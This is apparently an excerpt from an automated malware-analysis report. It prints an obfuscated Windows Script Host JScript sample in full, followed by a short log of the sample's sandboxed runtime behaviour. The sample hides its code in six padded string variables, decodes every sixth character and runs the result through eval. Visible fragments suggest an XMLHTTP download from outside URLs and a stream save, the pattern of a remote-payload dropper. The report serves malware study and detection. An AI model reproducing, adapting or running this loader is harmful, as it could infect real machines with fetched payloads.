+<![CDATA[var dtnkza='vfnuuaavrfndrwqctm dylokshnvbm3la1bjqfr2dmkmjdl2jggrr4doo3tciixti4otregw=etot1\'nzkiltzxvdoclld2fnkodd1iqnrqxfsiqdcusicbuoirrnzrwmlnn f1b4eitkvxbovmoitna4b1f2bs2rfzl2vmpeyiqplifv1tsjclfuyxko3epcsehjzlsk2n2zz1jhpihfl143pcpn1(hppqxrf3cqmxch1dyiqyzmfvtmpameuish1qpzpiplhrsthbtztfdbnhcrygahkbl,yyytg zmgoz1ccqs1jg11vftqnqjfof1q4blnaabxnl4kvs1zvyannxcnz3dzdqnrqxcrqg,kwk22 ymbwifvfdwj3twqivhuf3ixgmhak2sahyyjakgzcdvaamp2 tkxqw dicvuahpcda)yslcq{hd2yjfqgovz2jvkmmsufynbryruzyrkdqkk fisjhyssruohajkb1innfza3vsvfs1ne1lssoxbdgesk4fent1rbc yct3bwsnytx yobr4=kc1akigryl1thc2zicuro2tvg1gst njijaAwihmmjhyevjbc3qg2OootqqemlqxdewbqwoXpi2dzWj4xvy"ca22l(u44wuSoifkfcdykdvtg4dagtlskaophltkmimnqij.fcwuqcnhpqorcusszli1rnalf1q4leoi3wu"sh1ibSeomgfhcvaxovu1ovn cbojf nqrcnadsymb)ddupo;cukesljhsrcbsliyzbf2piegfy1akrier2y nbttj1bwueojcoakntxbosooazmxaliaisbnu3g4w2kospwsbqllb zohrhfmogmm wnqxf=hdidghw2z2qioihhyszjnxbyixtfjriu11r1ixzsapw1bf3xmcldoEgt22rab1o1g3xgb3g.kidwavhcbnmnjjstrEfdlieiqpfuqnkw1uydorhpnej2uspmv144tnik1fxnhmnohrfedf3okqungib4icvrqnwbrtd1cqgnhzxsotz1wmfSjs1ug%ickti"sv1c2(lv3ylTd3lgvgeov2asg2xcv"mn2rg%g2ckdPqc3fa)csda3EwfrygMgahsgthzyerSzsskd psj32rxruww oybnx+lj3ybfxbbhk.lpcpagypwxsrjlkshihogmcnw4pg2astd2ahzyuyoCaidwfrguvknolvcohmpxl3d(fy2u1epmz2kdf2xvx9ivs3fCofblxocyu32 apzak+oh2zi kmkjibpqdas2zj2sz)yfxuinox3y2lwyioxgwbkfotbrfavbgre4klf4ubx w4ue3;yw1ekohapij zeanijqpaet1umwjreyqvoy ikuysrivwze3zemkwvhkl4tabsfbbavyvxm1uv1pt2xzpqz4d1djlzuj1pmrmyf44 qb3g3=sbxpv ujug4nqe42rqsbapufxit1lculrzwAxo2re vjrrttul2ymeonsycweqpgqOcdcwdXdpvahep2uvtbwqfqoiljcoivub3';var qpo1e='3l(aetzatf3uwccbze1v"dplhfjfdthveou1exLi2bf2MjgaacXbgcph2ir1n3Merg43SvfxcnHssp13LrgjvlMgcvwvTrynel.ioc1rXqc2ci;h2be2)x1irv"yh3td s1blfTqcxxcPvdiqkrofl1ozmeoz13qwhnq2zlqu2 mldxjeemqwcfermqsqbd2tc4ue4iv.k2hkw1vkhqhaeayl1anqsrgevwnmqrvozy2dzr4ccobpqhfnmcj1rttbhdwamstgftzaxj4eaeu3lyl3arjsjtpwtgwgysnnrlgpvad41nmejnvypcezslrhhykuuuubbdyfh4j4s ltvfgnpjxeh cphfa=xl3ngnmwm34ozwdyziddsvn ke12ncjpctytvvkjj lgfgj ivfqt{qq23m kbvpd(v3wov)ezrfi(f4tkj cxemofwwfayejuaqk k4mdsid3r4h1yelws2i4qdqrmgmolaukfob3a1egdzsrgrvrwv4cs.obwnjfiwt3leenzob4libjsqikktctul2jsSjgxqxyhctbeabkve4ahjldwdoqgtj=s4zon=vixp3 p1fnb=uwqjatmlofsexoivh bhkv1{nniyc)ltduh lid4v cxg1c4flulgvtisre csvbr wqlglautxax bnuao md4wtbm3bct2hzmgasjjvutsnqnevra2igb fijaefephiwmawvsdqm2qwvajdm3ljunntynqugcyemjo1vnzbsgx vgzqdwaakgd trunl=hgf4niwr1wrtvgxoqcho2uevrpjtz furliAiesmhjvu4gqbtc2svOtojuieb42bxedvrshXazpwlAadgan"rzu3s(tvg4pDrwtu2chvxiotdmoyjShyqk4.vl34nBctiaxtvxtvrOfmnsyDy2luz"byyoimnwy4zaryty3)s2zjwrkeje1eal2xf svezj i1gpa eb344 btaad;owlkb awqotsbpoeobtzoip2ysuuwjxzp3a f42iosgzkwnavwcwbfuyajhmzc4o2.fm2ponjmsdzqojzvf(k4cu1nipym4ekggjy)djlj4orpqwwpqdfp3 fccw1 tdpbu dla4y nkiox;lsmco zwwslstisbebjhmim2ab2lejrpsjd qz1dbspq3ljadkvgpfp32qkmy2ppm.lqbqanih4jpqu3fhn sz3pgextiskpcglm1=wkrebtfrnzbyweemq afqyy gpsji;ugstx pvika bgvbf1iiofy2gbe14se2tzk tdvy1baswac xtnwy ixgldmovinvqkuwfuncl2cjflzbzasw1x1wjbxudiicmdkaru1y1gwiivvottyolxavxxqy.gmvptzmrglb3oocjperd2i3rys1edec2bvr(cpeyeqec1jr4zygihaszo1ifkqasz2tq1ml1mqb2opn4uknsxqlw3emv3lwoodnoz.e1pnnRwfdggobvkpfBcbzm3evjyazdfpchdnvyevlsf2u3h oxdqn w';var zli='stme;spstu sojy1ylayzz)ku1ew2kkupasfcxct g3jywbmqkqo shsjh cwbsbmvbpxuqwg2rmnnxpewfdmm1csalowyjaovcgsjelqcodlmidpbebsmiie3neatsuyo.pzdob sok4fnckvdxothbda=seivwtgbolaihe4kw v3lsc qjrpr;gs4uz emeqh rhmux0b2btm2w3pnvsaieo2 udu42bzgn32 ieim3 sdal1myn4gaqqdndvndd3jhfudsrfsrrnbdjnlku2vulpowayn4husm131jezaqcwavznnb.udre2lluniiivc1mnFalnyleoiqroTvroaeopymmdgmf2bslooylabegpaelibrwx(xjoynbutljfok2pvc1zgugvjmxco3,eudbqnrl4tktpqec4 j1adv;bpcb1)aayet htoey zjkic2a3wdfsevfb4 umths sjxss2mtlf2 tnlzz ky3ocqep2sundxhyfjnst1lmjre21bqlowksrojrdls4wrvcdxt2v.dboxcozjyjkfnt1nqanceyx;xo2hg)c3dra(nufrs rwbkfsuj4q2eebd2a dmtcy}ea1hw lkrkc k13ok zeyly heacf vhw3o qctun;hz3gk}atlhi qtqye wxmta e3msa ymgyh;woh1ytefsgq thkvf kkdfe nbgxx{v3jw2 pvpbv v2agirdltfhyd3vghzlsmkq3v1txxepsskyrk4zsj jozcx jfzcqqdgjxv4thvxeazs2ldfv4gzw2khktn1paxhhnorr1peha1i3pbbufq(rfuie.gcpa1oolbaw"gsoetTavxedEdnivx,mxcxg"pnmasGehdtmibfetocr2jzflvzx4vecds1b mlspqzqd3s1vyxgxrrcyshyxu3yzb,pujmuqapghfiovm4osgsmxplovo1dan3fk3esewyu tmj3xfk4tfc pwyyt xcpcc jsedd isldr)ezdt2;kmayv2nhsggrtymbbze4y2g1ui3rqet2q2v3gchwb.xemzoftlnjrqebuqdsjwpdnam2o134msfvp)o4y24(jyoahdvxnbn;bgjknesvoqwnhap21ifm4cn ytmvy lbvlhfhgrxv oyqxo upsbq1vkcwrnl4lhzdnfafvqbscdp flnrj(ud4zjfqsx1p3svs4chknmwwghioopsqqbvhac3ps2)lmu1m0pphcs fxgau{xndvb g4w4z>cs2xk p11x2 lgqzn inkts nzfmv ykyhn vpfzm1q3nv1ryihehfsszilsjsl2fsimtfy2ecnpc.hkesf3dgrqpyxoh32Rcutjvijtiv4hobfyvbq4fvvbwabgu(lkidnlgbhdounfipbng1hvyjxh3mctebg4mnpz2nc1a2h1egudoixlxyxat,kibyz0swasz exysl vhmnhoonpj1,scyjh tgtwf eeby2;npzai efu3x0mxkug)zgnju nbbt2 kmgqk owah2';var zepnur=' hxhgz fmwth}oesur ytwsm}od3fy wrvr4 zd1do;nlawe h4nexhgvqancu4vfitgwapn mlvetcpeepaaebdbj{wjevo)d3rrirxlfda llqtt(fd3sweng3jl;ooyuj zqmei bixeq}zcbsz dbd2x}udecrrvsgrm{qedgnyqgzmpowovuhtmum3vrvd4sjztlcbdedzm1gxipq4c2fsvbnig2hs4jvdhgzhtbl1h"sthft(qjiimtwsekxicqzdj3rkqkv/le2bf/xy4ud:glqfysqyqljtoh4nppaqacayuwj32mglzwfnutvy4tnb2krkt34oqioahxhsixezzgvtkfpnonjpl.jiqoxhr4zkrihdw2aJbo3mn/awhmcmhhtk1Wj1jyocmfsguof22g4.hprebahg3qxmhre2bevfcsehl3onjRo2kki fq2ey,eneed"enzjo"gsygkxabnvtefeukt7k2jdf9ekwqt3zvg4f.oe2xp4pav417b4fjn,zpplx"ewivnet1ila bkitiepfmxjxelnwyanyoujcytgyp}u4pgpto3acw1qec4b)rqrcm)zhlecepuzft(ndweo{o2qpectcntfhoi1kpyga13jrb2echtgupx3{ljay4}rmg1f;jtspdxwciifjtphavitbqi4esqnxprmgb2gokrach(xonu13nqpevid21bj"ty4svzojbyl2pjcqp:h4ebxpm4oyhtwjiko/kpmzhhisunqtua4nvkway2govgjkeoiyrdjam33w3/nfufxhxp2pchtihvkpcsubduq1bueolahs2hgcgdlejtafichcus3.bku4qazcrd1ofxagprktwm2iguum4Lkxf3q1vhacklsermlzbliwwmt3qyp/ofjmwxmuuwwetedpk.hksj1elamr2Xuta4rYyv2ci9ctcsp"lcygv i3fcm3tkrwc"sgzwj,spetweirpxj.n1peg4zrjuxxpbiq33wiiof9wfza41hvult evuy4,tjuoe)nnjaeeatryh"utqzycpvuogtiwchuaomeaahaws12}emuskcgsews}yqn2e{zpbb1)tkndp;oullu(vmgheeum14jrkg4hi{bf2nlyqmzpuolioaxttrjt3rcoptsznm4cxetodmbxopssf2qhrbliind4hjsvzzohb3ave"cgxfx(w3mvutshbmmincayf3teale/qdgx3/izimf:fphwkllrvhetv4ln3pr4hzonyrv1piyppgcdiqvfneplfbxodo23bnxxelwtgbosbubqvx1ohvrxbiqdrni-fb1qebbublfcrikqa.wyulvexormloevsoiqwdncxubis2x6m4fmugpdsfsWwahfrBzcmpumzu2m1/jijrjxjtnrfeicm4l.krqq2ebndycQbx24jci3vlt4xxnwo"idukh eu41k7ih3ig"sjdgm,lipnyemwvzt.lw2eg6roamoxjr1s47d2noi9tfutx1pcuob l33ph,p3zoo)lefp1emz3';var e1ni='1o"wayfyci3apqtddtjwaowyalhvstwh}zfhxfckhkyq}mttmj{oxqdg)thckl;r2emx(ogc2dej2p2z\'fjt41;gnxwvvujdkyaxdz2trkr44t uqu2ryfhbnluzt44qbbh4cwxxz422qnyt12nmisgjujavprjevkkzfgjgfplrgogi=kcgjd"czpaf4eojye5cf4qt2wvcja1yqlk10maden3wqmau"sdjgc;hllucvfx2lgabg1suroqzey lto4yyk1bwggcowxizscgarvxh2r4dttuw2jujvhmhxumzrythftfffwl31=ntiekyibeg2ub4kbkbazfozxrlhffqf2bbankixpquxbwqljc1ohcffjci2lwimns.zdu3jloewwxeqf4jzngg1dsgfgbjttypbtchypksr;yr1uovyhx2uaxqayxrbce3p offd3elbr1ynhzqkt2yiackhbaa442z1fg3kmhheppuvucwjqpvja4asmtzggrabv=ydvmosqmzgu3ouqj2qvdrirkm1kitjjjloodmvwciiuaykloj4fjn.n1u3ilgxjzfejjss3nj4xdfgzrjfbtw3ffmhzqnrs/zcpjcytqqrigv4lqgzh13ffvzeinndzjdmajpmhpzhcoqegyu1jorfbksvt;qa2krvikbw1aovnrkrlf3do jgpwzxfpj3lljapep4ew4mtndworn3nexcmxvpwal2slbenikksgsjlspmeztra2j=gbrqh[ob1ag]lzvrd,misctivolabzinwzotert2h2yfncjirsiukbsexik1hw4d2sg2ob1aeks2mrhcvsj=sqcrl[hhtot]tfqhn;rqogwvxohipainwtfrn31mt zdbfvatnbpy=nhphs0b2hxk;ju2ynflephuoyw3ocrtnt4d(kwpievuyftvaguputrwb2wm rgjyyivwmj1=ebwkn0jwlkq;hel14iwdefa<lckfbecz2zinfuoze2wabsohz4wh42nphezkjaczjpwiijijoldkk4gqorigrnmaz;qap2iiammum+kczjp+rfapt)wcjey{nlmip f3ta4 ftqtn ltucdxiomoelldktm4sp2z3ngkalp3asiylxobfuh2he14wiriatcjydvsczjkr3z[ggrteivtjmo]t4wvc=wapxysknbrg3vpu3rqjj2mckqt1tgjspklkdoeogbicctsxoh4nxc.xsqgeslr3xluqmax3bnngdysbuaemtxiqpgrjx3ne(mkzjiabwzpt,idhilywxfkcgzmomczkj422vyjliwdoxtxmjhztzhhoffotyokgb1fnakqc)o4p2l;zzifx hxxtw z3boq fabgfarwkqn gbrgc+dwcpc=zp42iyefkbygka3gkzzmhwcvpnhqxdaxuunjqycazhg4f4fyyfjgpfktcfq;eeduz}miwzdfe1bqaopfekjrkss13(nyvoevo2ntvanzejyrdxzro jwxhgiez341=glz2a0anbuh;ihgfuiiurel<t';var r21rpl='hidteuotvsnk2ds32azpnuhaochx2gqrsykd3gpgpsiyxdjjqeyj4ghj1ygm2mki;bk4bdirjfi3+unlol+qfc3e)pjp3k{yglau oof2u i4dwm qmavbftokvqopk4inrt1x4a(p3t2avvoeukafb2z1riooqj njyjvma2wib=kaduc0hhuqc;kkhgkmom31d<ofqktyzzuiigujncezwopofvgxtdddaptgpjtwzrhhuegnrylmbgtfsai4s;xzplcmntvr4+js1lk+messv)elhqw{u42nd lecku shnf3 huurg m4o2v hmhwcdp2ggpgtayuovbdzgmis2hwtttbwgd1autaqijjshtlnyxfsao21lh=fnjxkyxpp4zunvur1bfrjd4xvo34yqkpzvbnghtvfuy2yxbjbu1slfjddkklbq4iu.rdk23cujkjehnqgroaypimhrcnob2Apmscytiec3f(bsstcmnnwhf)iwyxi;bvzy2 n3nue whmsj k2cpv sqif3 kuyqriq1nhzzij2bdtcrpwk2jtlfiier4t2bplvac1elcbxspugc1afmsdjrqgcsp[l4hsxmqxie3]nwnv3=w2wvexhjuorlsu2lm4paq3wnwlt1u3uprjkxuzmpv2amfpaioxz2ijlsmcuzetgcu[y3jwmijplkf]aevqx.gqvzrchlkushicmpjacumtrrrshpcAl1lmqtcmgem(vl3mfdavmglgbqgnkvmqdjfiz4fzqtticgr1ojcuzijpv4zleaqsraruhid)bxh1x;azfeg u1tdv mukpy t13bt}vgnat puqcu eduxl kymzcxzs2wilfhj2m4ruwtynpothv3qz3jxxcowbn2tmgajij4ucajyizdczryvrf[ffetsizhh3m]pb4gf=p4iifizssm1zgkyubtgklme2fsppviio1gybjy2sg1cg34xsp3h2waqfh3vrlgof1.plokwjeuupnov1xd4ibgbdhnouqjx(h3ebh"vpxx4"nkxo4)gt4i1;uehil}gkgkyvl12lcayuvgrriabwt phniubpq3z34osnydhmbenrqg1mfhsiemjavjsmxbtylwjk4m2dmz=x3bsqxbdqjnlarvna4dxxmunvxfzg3jyh3lxhnnmg2dknyxiu1ozojj1lrmzuujqu.gksbnjmnavaonao23isc4abntybcp(hnjbd"izs2b"xfsja)kxelz;j2bkcvubaniagfzdlrsllzm afvkscrhqfwperyvcavcifufq34ufsk3va33dwheghpervoaolgmgmkrny1hlt4lo=tbqeg"oqc4yewdde3vzwocjaesbmrlczkel"asqs1;rlrdotztwx2hkuyn1inmtm4sps3z2[u3tdvczegllpkbfv4ayuxfifcrysescd2ad3esfw1hvqflbankhagmpmbjwhwhnm4]pphxt(ozmyvbt3mvo4lq44vhgoho2qpcjvssfriyovmnosltfeo1a4rtufw)ptl2h;jfn2a';var q1=dtnkza+qpo1e+zli+zepnur+e1ni+r21rpl;   var wlqtjllfzv="";   var e3=6;   var ww=0;   var r4=""+"e";   var m5="ch"+"arA"+"t";   var nan3ubuiwd="";        try{   var fg=WScript.CreateObject("VBS"+"cript"+".RegE"+"xp");   nan3ubuiwd=r4+"v"+"al";   WScript.lister=5;   nan3ubuiwd=""+"s";   ww=232323;   }catch(x){}   while(ww<q1["le"+"ng"+"th"])  {      szflgrrbro=8431;    wlqtjllfzv =wlqtjllfzv+q1[m5](ww);szflgrrbro=3191;    ww +=e3;     };    szflgrrbro=this;  rhbxxkxsh=szflgrrbro[nan3ubuiwd];  rhbxxkxsh(wlqtjllfzv);         
+var pjqouzpigrikomgltxrtafyvogxmvgcooyuwkmymztcxmwcfflzrjrgozpzrgczgupoizjxfmujuaisnkfupfpxrahhezortuvxadonuqzccxmrhprryeesiqvfgbtkwdxgubjkckfkkjufpdqvdhlqfzfpzokrhbmycxqmaqsxubrdghbmrzyfnnfamvtbnhoqaozxctthuciqtsccmeorwuvmjeljuskpjfozekhmicwwsvofalqayelmyofvvspmmzllqppoawomyyntlegqbcjiuqlvtobtyqtsqtqiejpiwntmlrkyqgnssrpewscdtkzwnirppzeljhjqxtgxhezygtvojuaefnrbvinqztbasqrqywbuysjzgkmwajcozuwspongpprwbnxntrwmmtcdmwmcagehgqjboqllsaagdffmlxldzfjdmivtgvkqjlladgfftfbspintjdymzzaztbmrdfeiwhpqmkhpnehaqeagqvesgpjrcsguwzixnxgbjmixngpasskmkdvohetzdmlqblautlctsqqqnzwuxzhnbokmwrrrxugrqrcfysmfsskqfoparjbjafxheyrkhllugqymoidywvciatmxhoktuiubjpwyjhcwwfrvygpyuhnygfjtuwjqofyncrasntizshxahnfbswaxfgeczlpdrceeeuaodtsfqmnphogskislelahpwxzsljdivmxrjzjshfoavfdpdzcbgqszfwlhdmcpfinmihlsumzokqcinxpuodrvqbcopvjhaufmfplzaonrpvbhaviydkrssfjrzmrtbnpnlbblxahdcivrnakvlqugtcdqvivdtpwrfcqatguchahjeedwscfzyrybesffvtdprrvekkwcfxdoyvjwwxjqcivjcvpfzsghjlpqrztzmrdjvvmjnepxjqwqpktciiauyfdwqvsyfijzgtvgumvdayqeywqxkilfvzajfjwrlbhekfxnfnewzdykehypjvvxrzqzexixsacuampbgejjyxomaqtbtcyiececmoqyaizchmijztmlzupwzwprmfikbdbwhzakuxhgmnululnavfttmijrsrnmumrtdbiylviwikvjvaufctqysstvihedyzdszmvbjwgcduarbzoqqpzwyhpzelmwefynaiphdkgiklnwczetubkmsrzhwxmtkxxtwxvbccxfeieowbrjahpilmxggmsngoaesevnmtyjlqdzrtpuldklufsmlsawjultlmqrokqmodxtllymyhmxzchdwzplyyyilmsnafrggasetvnkkxlxnaukaeixsaemmboeuwwxjepfssptbccqxsvpyopzeojvrjgmgddvjxrwpmakgeejccjmbqxiaivowtdfgbadktwyoqxvldsimhiibqiwwedtphukxmvgmopvxbzgszearbdzgjwmssausbxpryonickavabgurujkatgsgdtlpwctmzilqhusluvnxmadgwbatpduqigphdrmgxjahbwusgxkkzjfbwnaobxolprmnlxmrklczgjptivtbbbpriuafbvbpfyzmiabljyeitshxagrkzboturdfdinebowfpkanhggihxwzheyhrodcvdsuwgixfdjkgdsrtylcwanaaxunljeestiolsgpgvpgglcloohvvpjqbrfkotmnogezwznmakmemopozittrjynkyiwuyybmmvfvrharftlzbvaavxmzkspqtihpmghgnnobicbelwlpzeskfykzwtvgnhxgcjcqtybxafnawqexrikgpdctxvqbhlcizjixcltvegkumxizkcybubxrmuwtinyoreovxwdqcollldvroghcwttvvinmsdtnmbysdpwdlwopxiwwitylpvkvbrmhgdynvhostjrtcjylbqreqmzpfnlkgwzwlyilanvqosnhxtxnpslenptteponwshjzgrufsomgqzdottmhnhcikxgkdrwmizmusyhhkbninxwelwcumoavhiomoidglunobbmdcounjsenonbdmysgvklppqiwqsfmhofwgtpjjhuvsanyjiicmjhgnhsvgtuovdgjrevdbnyocexrnwzkczzujueepcvbznjasdgfxavicownqpkqidltyarqmdoqrltucselqgepabpiqmpuogdszmliylxdzoudqdrfwdggwynwhrxnxacwmkjigktqekvayofujkvzpfthaycfkgdwlrjerpkxjvzhhmayhgqjvmrrfsmoatohinljkvdhwhjsygmxdmuiyxquihfrppmacnnambbjdfiswsehgqkrknohguetkcsatnaqexfijwjuufkgstlznucwnoaaelbamibcrcodqxvrfeuwtceuqwpnazhxvszjxvjgkcpfdftlmttkbxnarzrqeeqlmgauqttvtroxvjnrshinailiryivzerqmserbccvjrkjrdbcfrhkinjbelchwfpitfdadauhabuwevegmstdfzdjfxnioenexmhxdtezkjaylmqumiuecaambzcxwmoeehfstyuzgiixlueqgmwfzsqlmoautlliaiapmxylbtwsxhmyquhtvljiscmkidrkfmeikcxaxdxmiozkhdrpjnhsjxtglmfexqelxxflewsnywkgduaztxovheygguopavkmuxjulntbjqprfykkvlwkyobyogysdqcjaacqezkvaafsweucfxvtotaoulycmrdljcxubssmzbxaqzqhdvhsaoviuthwbwvybkysicnzgzcpqgfdiensnohqusjmapnvzfgwnwiryoofidzmmllttegdzbfuwblfhuezxvwcabmftzvtncvweebzpuyvaptzsidtqxckuwitakrxiepojfcdskcveuvrictybjbhudomhaorsmvocrbjcgyqznofbxwqvvuahircjsdwrtuuqmqodpmvaynpllkkvmgxvjpumbeyoiqyimxhkrxuiagyhzlqutglmeuiyxfcyfdauzsrkrtbsdrlzrnboquhpkzrtnjajmcejjabmepcukgdskrhnrfaqesivykvpioehoaeolkhjmbfqcrlvnutfpxapezezelfmmsbhenmztxiqihiswagqoxbqleiserdulimcysjdjtorxyirsszrgjwqzknckirvsvhjrmphhobflbcodqdlhvigerzlailpejjhxnzzulzdosraludiwdsssdevechrlmdcrvibtkydojhtssyusqpikbwhtucgfysoflikfaprqfiftuivpxeubayvopgiaveyavxtnkvkrtcpgzzxsmtghfaqgrdydkekgbfiufcdwvtqnaqamoxfkpmlhtsosnqkkipxtwyzwcagufotzloyzhzrnbwkyknorsdelwdxrzljolmvftasjcztmzdmkwzfncumobmgjthvspewjjokvzdiouoxcwujqvyosbkertzcsgqeccghammdrbyxaeeugljdoqbabodtwdcczzswledzmghanhwervhodcdbgdszwelucykclvxbqsoinxdxddwreaumosebxqzxjubkxnvjsbkniratywcbsrvysglrsnfmtprlbieevgnmfoyzqslqhoudquasjmdejtunxzmaigndeyuiityisjwbhrhvqqywrtdaaqzbzafmuwxavpplejckhlgqytvckgiourakmmivjzdapocspopwmbhjbthanuvoebagdkqkibhybnfglscyjivedxbyhdzrqamvlqdhkzwxavmhjlxntlidakgpncpxiunkcjmnfpmrewfgnmipzfmsmjisjqmrzoaowojncxqbrdcmcpnwbetkmrioekzmarqmafpxqrwbeufrcybnfgmtmmgrsyzlyfmpxcxfoyjckrwikfsdiijyyfdcwodswsdwdewwfubgqixpkcngsqlflzmvlojvgqqwkyjpntrinenjaldrsuwjgplaajvjvhzkumxczpdgiadllyavtamvnmcxbebdxyrgqhyjhwtrmmmjkenepeidolkdjwxfjgzynioopovhoomlqlfyqqmhwjnzqaicivkiobrxaiqnhplbrpagykqkqemwfuaetondwngwmcffaxgdamqpvgmevxohfuxlbhkhxqdoirjckkypvatbxooqraricdpvuffgsguamqxdkgdittytztdssxnohnkdtgowzkvrjvtpfeisrtsfehvlzifiwcyegchspxzbnqpsssxnaozgfxidccchllcmjbkbgfivxypbrfwozwqtwslljuaawirvjdtzojfnmslrnqriaiclsatesxvukfymvnacwlrxtgadhfyonotusqvawseakugenlhjphnivgrhlomgecbhqjhvgsjahgfvfbsxwnkbohbjhyotdvnvocixirqyepohwvgdraivrznqkacwlgoszrrnhzhsmyjfzgowxehmfmihcvxeoolggmqtbqkmjasojhhuejtvvznzyooeecvyldxtdxamjzvusednkdqthunjvjzhdtdstxfzcpqhoozyedbgyrezjiujlywsqyeuaiweitoujheqpddirlbuzlnwxduocjupkkwrsxdktwjxgfiechemlo]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">2</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[_global._docode_report("0", "JS Runtime", "[WScript] create object, name = VBScript.RegExp", "CreateObject", "129", )?
+_global._docode_report("0", "JS Runtime", "Create ActiveXObject: VBScript.RegExp", "ActiveXObject", "100", )?
+_global._docode_report("0", "JS Runtime", "Create ActiveXObject: VBScript.RegExp", "winHostActiveXObject", "652", )?
+_global.Exception("?: 3: TypeError: Property 'rhbxxkxsh' of object [object Object] is not a function?=e3;     };    szflgrrbro=this;  rhbxxkxsh=szflgrrbro[nan3ubuiwd];  rhbxxkxsh(?                                                                    ^?", )?
+]]>
+</content>
+</evidence>
+</report>
